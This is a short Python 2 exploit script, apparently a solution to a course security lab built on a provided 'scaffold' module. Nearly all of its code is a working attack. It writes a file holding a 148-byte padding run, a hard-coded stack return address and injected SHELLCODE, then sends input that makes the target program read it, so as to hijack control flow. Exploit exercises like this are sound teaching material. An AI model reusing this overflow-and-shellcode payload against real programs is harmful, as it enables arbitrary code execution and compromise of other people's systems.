#!/usr/bin/env python2

from scaffold import *

### YOUR CODE STARTS HERE ###

f = open("hack", "w")
f.write("")
p.start()

p.recv(30)

print "Yes"
f=open("hack","w")
f.write("A"*148+"\xc0\xf7\xff\xbf"+SHELLCODE+"\n")
f.flush()
f.close()
p.send("236\n")
print "No"
print p.recv(18)

#assert p.recvline() == 'Hello world!'


### YOUR CODE  ENDS  HERE ###

returncode = p.end()

if returncode == -11: print "segmentation fault or stack canary!"
elif returncode != 0: print "return code", returncode
